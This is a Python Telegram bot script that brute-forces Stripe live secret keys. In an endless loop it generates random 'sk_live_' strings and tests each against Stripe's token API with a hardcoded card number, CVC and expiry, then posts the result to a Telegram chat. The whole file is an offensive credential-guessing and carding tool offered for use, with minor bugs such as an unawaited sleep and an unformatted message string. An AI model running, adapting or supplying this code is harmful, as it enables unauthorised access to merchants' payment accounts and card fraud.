import requests, random, string, os, asyncio,logging 
from pyrogram import Client, filters
from logging.handlers import RotatingFileHandler


if os.path.exists("logs/Log.txt"):
    with open("logs/Log.txt", "r+") as f_d:
        f_d.truncate(0)

logging.basicConfig(level=logging.DEBUG,
           format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
           datefmt="%d-%b-%y %H:%M:%S",
           handlers=[RotatingFileHandler(
            "logs/Log.txt",
            maxBytes=1000000,
            backupCount=10),logging.StreamHandler()])

log = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)


bot_token = os.environ.get("BOT_TOKEN")
chatid = os.environ.get("FORWARD_ID")
api_id = os.environ.get("APIID")
api_hash = os.environ.get("APIHASH")



class Bot(Client):

    def __init__(self):
        super().__init__(
            session_name="BOT",
            api_id=api_id,
            api_hash=api_hash,
            bot_token=bot_token,
            plugins={"root": "plugins"}
        )

    async def start(self):
        await super().start()
        
        log.info("<<[Bot Started]>>")
    async def stop(self, *args):
        await super().stop()
        log.info("<<[Bot Stopped]>>")

    
async def checksk(app,type):
    if type=="short":
       skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
    else:
      skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
    await validate(app,skkey)


async def validate(app,skkey):
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
      log.error(f"DEAD > {skkey}")
      return await app.send_message(chat_id=chatid,text=f"Ded Sk 💖\n{skkey}")
    else:
      log.info(f"LIVE > {skkey}")
      return await app.send_message(chat_id=chatid,text="Live Sk 💖\n{skkey}")

async def backgen(app):
    print("Starting")
    asyncio.sleep(30)
    print("Stared macha")
    while True:
      await checksk(app,"long")
      # await asyncio.sleep(0.2)
      await checksk(app,"short")



if __name__ == "__main__": 
    
    app = Bot()

    asyncio.get_event_loop().create_task(backgen(app))
    app.run()


